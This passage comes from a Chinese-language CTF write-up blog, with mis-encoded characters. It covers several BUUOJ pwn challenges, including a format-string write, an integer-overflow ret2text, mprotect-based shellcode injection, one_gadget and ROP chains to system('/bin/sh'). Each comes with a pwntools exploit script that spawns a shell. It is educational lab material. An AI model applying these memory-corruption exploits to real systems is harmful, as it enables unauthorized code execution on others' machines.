0x61616161ï¼‰</p><p><img src="https://i.loli.net/2020/09/18/Qiglex7ZCfsFhub.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pwntoolsä¸­çš„<code>fmtstr_payload()</code>æ¥æ¯”è¾ƒæ–¹ä¾¿åœ°æ„é€ èƒ½å¤Ÿè¿›è¡Œä»»æ„åœ°å€å†™çš„payload</p><blockquote><p>å…·ä½“ç”¨æ³•å¯ä»¥ç™¾åº¦ï¼Œè¿™é‡Œå°±ä¸å†æ‘˜æŠ„ä¸€éäº†</p></blockquote><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804c044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png" alt="image.png"></p><h1 id="0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text"><a href="#0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text" class="headerlink" title="0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text"></a>0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>ä¸»å‡½æ•°ä¸­è¯»å…¥æœ€å¤§0x400ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å¼€è¾Ÿäº†0x408å­—èŠ‚çš„ç©ºé—´ï¼Œæ— æ³•æº¢å‡º</p><p><img src="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png" alt="image.png"></p><p>åŒæ—¶ä¸»å‡½æ•°ä¼šå°†è¾“å…¥ä¼ å…¥<code>name_check()</code>å‡½æ•°ä¸­ï¼Œè‹¥é€šè¿‡<code>strlen()</code>è®¡ç®—å‡ºæ¥çš„é•¿åº¦åœ¨4~8ä¸ªå­—èŠ‚ä¹‹é—´åˆ™ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥é€šè¿‡<code>strcpy()</code>æ‹·è´è‡³<code>dest</code>ä¸Šï¼Œè€Œè¿™é‡Œåˆ°ebpä¹‹é—´åªæœ‰<code>0x11</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡è¿™æ®µä»£ç è¦†ç›–æ‰è¯¥å‡½æ•°çš„è¿”å›åœ°å€</p><p><img src="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°</p><p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p><p>è€ƒè™‘åˆ°åœ¨<code>name_check()</code>å‡½æ•°ä¸­ç”¨æ¥å­˜æ”¾è¾“å…¥é•¿åº¦çš„å˜é‡ä¸º8ä½æ— ç¬¦å·æ•´å‹ï¼ŒèŒƒå›´ä¸º0~255ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥260ä¸ªå­—èŠ‚ä¾¿å¯ä»¥å‘ç”Ÿä¸Šæº¢é™ä½¿è¯¥å˜é‡çš„å€¼ä¸Šæº¢ä¸º4ï¼Œç»•è¿‡åˆ¤å®š</p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./r2t3&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å‘é€payloadå³å¯getshell</p><p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p><h1 id="0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode"><a href="#0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode" class="headerlink" title="0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode"></a>0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode</h1><blockquote><p>æ³¨ï¼šè¿™æ˜¯ä¸€é“å±‘é¢˜</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªèµ¤è£¸è£¸çš„<code>gets()</code>æº¢å‡º</p><p><img src="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png" alt="image.png"></p><p>åŒæ—¶å­˜åœ¨ä¸€ä¸ª<code>get_flag()</code>å‡½æ•°å¯ä»¥è·å–flagï¼Œä¸è¿‡è¦æ±‚å‚æ•°1ä¸º<code>0x308cd64f</code>ï¼Œå‚æ•°2ä¸º<code>0x195719d1</code></p><p><img src="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png" alt="image.png"></p><h2 id="è§£æ³•1ï¼šret2text"><a href="#è§£æ³•1ï¼šret2text" class="headerlink" title="è§£æ³•1ï¼šret2text"></a>è§£æ³•1ï¼šret2text</h2><p>32ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚ï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¸è¿‡å¾ˆæ˜æ˜¾ï¼Œå‡ºé¢˜äººçš„ç¯å¢ƒå¾ˆæ˜æ˜¾æœ‰ä¸¶å°é—®é¢˜ğŸ”¨ğŸ”¨ğŸ”¨ï¼Œè¿œç¨‹è·‘ä¸é€šè¿™ä¸ªpayload</p><p><img src="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png" alt="image.png"></p><p>é—®é¢˜å‡ºåœ¨å“ªå‘¢ï¼Ÿè¯¥ç¨‹åºå°è¯•æ‰“å¼€çš„æ˜¯<code>flag.txt</code>æ–‡ä»¶ï¼Œä½†æ˜¯å¹³å°æ‰€è‡ªåŠ¨ç”Ÿæˆçš„æ˜¯<code>flag</code>æ–‡ä»¶ï¼Œæ•…æ­¤ç§æ–¹æ³•<strong>æ— æ³•è·å¾—flag</strong></p><p>æˆ‘ä»¬å°è¯•å¯»æ‰¾ç¬¬äºŒç§è§£æ³•</p><h2 id="è§£æ³•2ï¼šret2shellcode"><a href="#è§£æ³•2ï¼šret2shellcode" class="headerlink" title="è§£æ³•2ï¼šret2shellcode"></a>è§£æ³•2ï¼šret2shellcode</h2><p>é¦–å…ˆæˆ‘ä»¬å‘ç°åœ¨ç¨‹åºä¸­ç¼–å…¥äº†å¤§é‡çš„å‡½æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<code>mprotect()</code>ï¼Œå¯ä»¥ä¿®æ”¹æŒ‡å®šå†…å­˜åœ°å€çš„æƒé™</p><p><img src="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png" alt="image.png"></p><p>æ•…è€ƒè™‘ä½¿ç”¨<code>mprotect()</code>ä¿®æ”¹å†…å­˜æ®µæƒé™ä¸ºå¯è¯»å¯å†™å¯è¿è¡Œååœ¨ä¸Šé¢å†™å…¥shellcodeå¹¶è·³è½¬è‡³å†…å­˜æ®µæ‰§è¡Œshellcodeä»¥getshell</p><p>åœ¨<strong>pwndbg</strong>ä¸­ä½¿ç”¨<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜æ®µï¼Œå‰é¢ä¸‰ä¸ªæ®µéšä¾¿é€‰ä¸€ä¸ªå°±è¡Œ</p><p><img src="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†<code>mprotect()</code>çš„å‚æ•°å¼¹å‡ºï¼ˆæ—¥å¸¸è¸©å‘ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29719)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x804951c</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ec000</span></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯getshell</p><p><img src="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png" alt="image.png"></p><h1 id="0x00D-ciscn-2019-n-8-overwrite"><a href="#0x00D-ciscn-2019-n-8-overwrite" class="headerlink" title="0x00D.ciscn_2019_n_8 - overwrite"></a>0x00D.ciscn_2019_n_8 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†<strong>æ ˆä¸å¯æ‰§è¡Œã€åœ°å€éšæœºåŒ–ã€Canary</strong>ä¸‰å¤§ä¿æŠ¤ï¼ˆ<del>å™”  å™”  å’š</del></p><p><img src="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png" alt="image.png"></p><p>ä½¿ç”¨scanfè¯»å…¥å­—ç¬¦ä¸²åˆ°å˜é‡<code>var</code>ï¼Œå­˜åœ¨æ¼æ´ï¼ŒåŒæ—¶ç¨‹åºä¼šå°†varçš„åœ°å€è½¬æ¢ä¸ºä¸€ä¸ª(_QWORD)ç±»å‹æŒ‡é’ˆï¼ˆé•¿åº¦ä¸ºå››å­—èŠ‚ï¼‰ï¼Œå¹¶åˆ¤æ–­<code>var[13]</code>æ˜¯å¦ä¸º<code>0x11</code>ï¼Œè‹¥æ˜¯åˆ™è¿”å›ä¸€ä¸ªshell</p><p>æ•…è€ƒè™‘ç›´æ¥è¾“å…¥å°†<code>var[13]</code>è¦†å†™ä¸º<code>0x11</code>å³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_8&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,29901)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p><h1 id="0x00E-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00E-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00E.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00E.not_the_same_3dsctf_2016 - ret2shellcode</h1><blockquote><p>not the sameï¼ˆæŒ‡ the sameï¼ˆ</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p><p>æ‹–è¿›IDAé‡Œåº·åº·</p><p><img src="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä¸­ç›´æ¥å­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„<code>gets()</code>å‡½æ•°ï¼ŒåŒæ—¶è¿˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæç¤ºä¿¡æ¯â€”â€”<strong>bora ver se tu ah o bichao memo</strong>ï¼Œå¤§è‡´å¯ä»¥ç¿»è¯‘ä¸ºï¼š<strong>Did you see the wrong note?</strong><del>çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨çš„æ ·å­</del></p><p>å°è¯•å…ˆä½¿ç”¨ä¸å‰ä¸€é¢˜ç›¸åŒçš„æ€è·¯æ¥è§£</p><p>é¦–å…ˆç”¨<code>pwndbg</code>çš„<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜</p><p><img src="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png" alt="image.png"></p><p>åŒæ—¶IDAä¸­æˆ‘ä»¬å‘ç°ç¨‹åºä¸­ä¾ç„¶å­˜åœ¨<code>mprotect()</code>å‡½æ•°å¯ä»¥æ”¹å†™æƒé™</p><p><img src="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png" alt="image.png"></p><p>å’Œå‰ä¸€é¢˜æ‰€ä¸åŒçš„æ˜¯gadgetçš„ä½ç½®æœ‰ä¸¶å°å˜åŒ–ï¼ˆ<del>åŸæ¥åªæœ‰è¿™ä¸ªä¸åŒğŸ</del>ï¼‰</p><p><img src="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png" alt="image.png"></p><p>æ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ä¸å‰ä¸€é¢˜å‡ ä¹å®Œå…¨ç›¸åŒçš„exp</strong>æ¥getshellï¼Œåªéœ€è¦æŠŠcsué‡Œçš„gadgetçš„åœ°å€ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,28147)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x80494dc</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ea000</span></span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—shell</p><p><img src="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png" alt="image.png"></p><h1 id="0x00F-one-gadget-one-gadget"><a href="#0x00F-one-gadget-one-gadget" class="headerlink" title="0x00F.one_gadget - one_gadget"></a>0x00F.one_gadget - one_gadget</h1><blockquote><p> é¦–å…ˆä»é¢˜ç›®åå­—æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºè¿™é“é¢˜åº”è¯¥éœ€è¦æˆ‘ä»¬ç”¨åˆ°ä¸€ä¸ªå·¥å…·â€”â€”<a href="https://github.com/david942j/one_gadget">one_gadget</a></p><p> ä»€ä¹ˆæ˜¯one_gadgetï¼Ÿå³åœ¨libcä¸­å­˜åœ¨ç€çš„å¯ä»¥ç›´æ¥getshellçš„gadget</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p><p><img src="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png" alt="image.png"></p><p>æ‹–è¿›IDAé‡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä¼šè¯»å…¥ä¸€ä¸ªæ•´æ•°åˆ°<strong>å‡½æ•°æŒ‡é’ˆ</strong>v4ä¸­ï¼Œå¹¶å°è¯•æ‰§è¡Œ<code>v4()</code>ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥<strong>one_gadget</strong>çš„åœ°å€å³å¯getshell</p><p>ä½¿ç”¨<code>one_gadget</code>å·¥å…·å¯ä»¥æ‰¾å‡ºlibcä¸­çš„getshell gadget</p><blockquote><p>ä¸æ˜åŸå› åœ¨archä¸Šä¸€ç›´æ²¡æ³•è¿è¡Œï¼Œåªå¥½åˆ‡åˆ°Ubuntu</p></blockquote><p><img src="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png" alt="image.png"></p><p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“libcçš„åŸºå€</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>init()</code>å‡½æ•°ä¸­ä¼šè¾“å‡º<code>printf()</code>å‡½æ•°çš„åœ°å€ï¼Œæœ‰äº†è¿™ä¸ªæˆ‘ä»¬ä¾¿å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œä¹Ÿå°±æœ‰äº†one_gadgetçš„çœŸå®åœ°å€</p><p>è€Œé¢˜ç›®ä¹Ÿç»™äº†æˆ‘ä»¬libcï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe237f</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./one_gadget&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27792)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./one_gadget&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;here is the gift for u:&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">getshell = libc_base + one_gadget</span><br><span class="line">p.sendline(<span class="built_in">str</span>(getshell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x010-jarvisoj-level2-ret2text"><a href="#0x010-jarvisoj-level2-ret2text" class="headerlink" title="0x010.jarvisoj_level2 - ret2text"></a>0x010.jarvisoj_level2 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png" alt="image.png"></p><p>è¯»å…¥æœ€å¤§0x100å­—èŠ‚ï¼Œä½†æ˜¯<code>buf</code>åˆ°ebpä¹‹é—´åªæœ‰0x88å­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æº¢å‡º</p><p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“è¯¥ç¨‹åºä¸­æœ‰<code>system()</code>å‡½æ•°å¯ä»¥åˆ©ç”¨</p><p>åŒæ—¶ç¨‹åºä¸­è¿˜å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png" alt="image.png"></p><p>æ•…åªéœ€è¦æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26276)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png" alt="image.png"></p><h1 id="0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><a href="#0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu" class="headerlink" title="0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu"></a>0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png" alt="image.png"></p><p>ä½¿ç”¨<code>scanf(&quot;%s&quot;)</code>è¯»å…¥å­—ç¬¦ä¸²ï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p><p><img src="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png" alt="image.png"></p><p>å­˜åœ¨<code>system()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png" alt="image.png"></p><p>å­˜åœ¨<code>/bin/sh</code>å­—ç¬¦ä¸²</p><p>æ•…è€ƒè™‘ä½¿ç”¨csuä¸­gadgetæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å‡½æ•°ä»¥getshell</p><p><img src="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png" alt="image.png"></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27558</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span 